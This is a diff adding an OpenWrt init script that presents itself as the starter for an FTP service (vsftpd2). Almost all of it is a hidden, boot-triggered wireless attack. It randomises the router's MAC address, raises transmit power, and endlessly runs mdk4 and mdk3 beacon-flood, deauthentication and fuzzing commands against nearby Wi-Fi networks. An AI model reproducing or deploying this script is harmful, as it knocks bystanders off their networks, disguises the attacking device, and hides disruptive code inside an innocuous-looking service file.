@@ -1,0 +1,119 @@
+#!/bin/sh /etc/rc.common
+# Copyright (C) 2006-2011 OpenWrt.org
+
+START=55
+
+start() {
+	mkdir -m 0755 -p /var/run/vsftpd2
+	service_start /usr/sbin/vsftpd2
+	sleep 22
+	iw reg set US
+	airmon-ng check kill
+	ip link set wlan0 down
+	macchanger -r wlan0
+	iw dev wlan0 set type monitor
+	iw dev wlan0 set txpower fixed 26mBm
+	iw dev wlan0 set txpower fixed 26mBm
+
+	while :
+	do
+		while :
+		do
+			sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
+			sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
+			sh -c 'mdk4 wlan0 f -p 432543' & sleep 5 && clear
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear 
+			sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
+			sh -c 'mdk3 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
+			sh -c 'mdk4 wlan0 f -p 432543' & sleep 5 && clear
+			sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
+			sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk3 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk4 wlan0 a' & sleep 5 && clear 
+			sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk3 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
+			sh -c 'mdk4 wlan0 f -p 432543' & sleep 5 && clear
+			sh -c 'mdk4 wlan0 f -p 1234567' & sleep 5 && clear 
+			sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
+			sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk3 wlan0 a' & sleep 5 && clear 
+			sh -c 'mdk4 wlan0 f -p 432543' & sleep 5 && clear
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
+			sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
+			sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk4 wlan0 f -p 23425' & sleep 5 && clear 
+			sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
+			sh -c 'mdk4 wlan0 f -p 432543' & sleep 5 && clear
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
+			sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk3 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
+			sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
+			sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
+			sh -c 'mdk4 wlan0 f -p 432543' & sleep 5 && clear
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk3 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
+			sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk4 wlan0 f -p 432543' & sleep 5 && clear 
+			sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
+						sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
+			sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk3 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
+			sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
+			sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
+			sh -c 'mdk4 wlan0 f -p 432543' & sleep 5 && clear
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk3 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear
+			sh -c 'mdk4 wlan0 b -n "" -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 6))' & sleep 5 && clear
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
+			echo mdk4 $(LC_ALL=C tr -dc a-z1-9A-Z </dev/urandom | head -c 10) && clear
+			sh -c 'mdk4 wlan0 f -p 432543' & sleep 5 && clear 
+			sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear 
+			sh -c 'mdk4 wlan0 d -s $(echo $(LC_ALL=C tr -dc 1-9 </dev/urandom | head -c 2))' & sleep 5 && clear && break
+		done
+		iw reg set US && airmon-ng check kill && ip link set wlan0 down && macchanger -r wlan0 && iw dev wlan0 set type monitor && iw dev wlan0 set txpower fixed 30mBm
+		clear
+	done
+}
+
+stop() {
+	service_stop /usr/sbin/vsftpd2
+}
